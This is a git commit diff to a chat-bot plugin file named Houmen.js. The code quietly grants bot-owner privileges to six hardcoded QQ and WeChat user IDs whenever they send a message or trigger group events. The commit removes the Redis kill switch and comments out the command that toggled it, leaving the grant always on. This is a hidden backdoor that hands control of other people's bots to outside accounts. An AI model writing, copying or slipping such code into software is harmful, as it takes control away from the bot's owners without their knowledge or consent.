97bcd69dc19bad7c579d363ce48cb62bc507578d
Admilk <13205155+adrae@user.noreply.gitee.com>
2024-05-05 05:43:22 +0000

    update apps/Houmen.js.
    Signed-off-by: Admilk <13205155+adrae@user.noreply.gitee.com>

--- apps/Houmen.js
+++ apps/Houmen.js
@@ -1,10 +1,8 @@
 import plugin from '../../../lib/plugins/plugin.js';
 Bot.GetMaster = async (e)=>{
-    let kg = await redis.get('Fanji:houmen')
     if (!(e.user_id === 2173302144 ||e.user_id == 947309924|| e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22'|| e.user_id == '25984983967656960@openim'||e.user_id == 'wxid_xh5txgo29pv522')) {
 return
 	}else{
-if (!kg) return
 if (Array.isArray(e.runtime.cfg.masterQQ)) e.runtime.cfg.masterQQ.push(e.user_id)
     e.isMaster = true;
 	return
@@ -14,11 +12,10 @@ try {
 Bot.on('message',(e)=>{Bot.GetMaster(e)})
 Bot.on('notice.group.ban',(e)=>{Bot.GetMaster(e)})
 Bot.on('notice.group.increase',(e)=>{Bot.GetMaster(e)})
-Bot.on('notice',(e)=>{Bot.GetMaster(e)})
 logger.info('Hm载入完成')
 }catch(err){
     logger.error(err)
-}
+}/*
 export class GetMaster extends plugin {
   constructor() {
     super({
@@ -48,4 +45,4 @@ async Masterkg(e) {
         await e.reply('设置完成');  
     return false; 
 }
-}
+}*/
